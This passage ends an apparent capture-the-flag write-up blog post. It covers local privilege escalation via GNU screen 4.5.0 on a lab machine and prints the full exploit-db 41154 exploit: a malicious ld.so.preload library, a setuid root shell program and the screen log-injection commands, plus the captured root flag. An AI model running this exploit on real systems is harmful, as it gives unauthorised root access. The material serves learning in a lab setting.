</code></pre></div><p>only <em>screen</em> has a version in a name of file and that&rsquo;s interesting.
We can look at the internet and find the exploit if exists.
The best way how to find the correct exploit and not malware :)
is on 
<a href="https://www.exploit-db.com" target="_blank" rel="nofollow noreferrer noopener">exploit-db</a> website from offensive-security.</p>
<p>I found one that could works.

<a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="nofollow noreferrer noopener">exploit</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /tmp/libhax.c
</span><span style="color:#e6db74">#include &lt;stdio.h&gt;
</span><span style="color:#e6db74">#include &lt;sys/types.h&gt;
</span><span style="color:#e6db74">#include &lt;unistd.h&gt;
</span><span style="color:#e6db74">__attribute__ ((__constructor__))
</span><span style="color:#e6db74">void dropshell(void){
</span><span style="color:#e6db74">    chown(&#34;/tmp/rootshell&#34;, 0, 0);
</span><span style="color:#e6db74">    chmod(&#34;/tmp/rootshell&#34;, 04755);
</span><span style="color:#e6db74">    unlink(&#34;/etc/ld.so.preload&#34;);
</span><span style="color:#e6db74">    printf(&#34;[+] done!\n&#34;);
</span><span style="color:#e6db74">}
</span><span style="color:#e6db74">EOF</span>

$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c                                                      
$ ls /tmp/                                          
$ cat <span style="color:#e6db74">&lt;&lt; EOF &gt; /tmp/rootshell.c                                                                               
</span><span style="color:#e6db74">#include &lt;stdio.h&gt;                                       
</span><span style="color:#e6db74">int main(void){                                          
</span><span style="color:#e6db74">    setuid(0);                                           
</span><span style="color:#e6db74">    setgid(0);
</span><span style="color:#e6db74">    seteuid(0);
</span><span style="color:#e6db74">    setegid(0);
</span><span style="color:#e6db74">    execvp(&#34;/bin/sh&#34;, NULL, NULL);                       
</span><span style="color:#e6db74">}        
</span><span style="color:#e6db74">EOF</span>    
                            
$ gcc -o /tmp/rootshell /tmp/rootshell.c
$ cd /etc/
$ umask <span style="color:#ae81ff">000</span>
$ screen -D -m -L ld.so.preload echo -ne  <span style="color:#e6db74">&#34;\x0a/tmp/libhax.so&#34;</span>                                                
$ /bin/screen-4.5.0/screen-4.05.0 -D -m -L ld.so.preload echo -ne  <span style="color:#e6db74">&#34;\x0a/tmp/libhax.so&#34;</span>                       
$ /tmp/rootshell 
</code></pre></div><p>And now we have root priviledges, so let&rsquo;s take the last one flag.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># cat /root/flag4</span>
6b873b86b1f3eb170554af54fddb8267
</code></pre></div><ul>
<li><strong>FLAG4: 6b873b86b1f3eb170554af54fddb8267</strong></li>
</ul>
<p>I hope you enjoy the game and learn something new.
Bye;)</p>

    </div>
</article>
<div class="pagination">
    
    <div class="prev"> <a href="/ctf/daily-bugle/">Previous Post</a> </div>
    
    
    <div class="next"> <a href="/ctf/inclusion/">Next Post</a> </div>
    
</div>


        </main><footer class="site-footer">
	<span class="left">Gohugo/0.80.0 </span> 
	<span class="right">
		<em>.burso</em>
	</span>
</footer>
</body>
</html>
